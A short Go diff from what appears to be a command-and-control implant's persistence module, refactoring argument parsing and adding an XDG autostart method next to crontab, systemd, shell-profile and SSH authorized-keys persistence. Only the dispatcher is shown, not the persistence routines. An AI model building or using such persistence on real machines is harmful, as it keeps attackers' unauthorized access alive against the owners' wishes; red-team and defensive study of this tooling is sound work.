@@ -4,7 +4,6 @@
 package commands
 
 import (
-	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -38,14 +37,9 @@ type persistArgs struct {
 }
 
 func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
-	var args persistArgs
-
-	if task.Params == "" {
-		return errorResult("Error: parameters required (method, action, name, path)")
-	}
-
-	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	args, parseErr := requireParams[persistArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if args.Action == "" {
@@ -61,10 +55,12 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistShellProfile(args)
 	case "ssh-key", "authorized-keys":
 		return persistSSHKey(args)
+	case "xdg-autostart", "xdg", "autostart":
+		return persistXDGAutostart(args)
 	case "list":
 		return persistLinuxList()
 	default:
-		return errorf("Unknown method: %s. Use: crontab, systemd, shell-profile, ssh-key, or list", args.Method)
+		return errorf("Unknown method: %s. Use: crontab, systemd, shell-profile, ssh-key, xdg-autostart, or list", args.Method)
 	}
 }
 
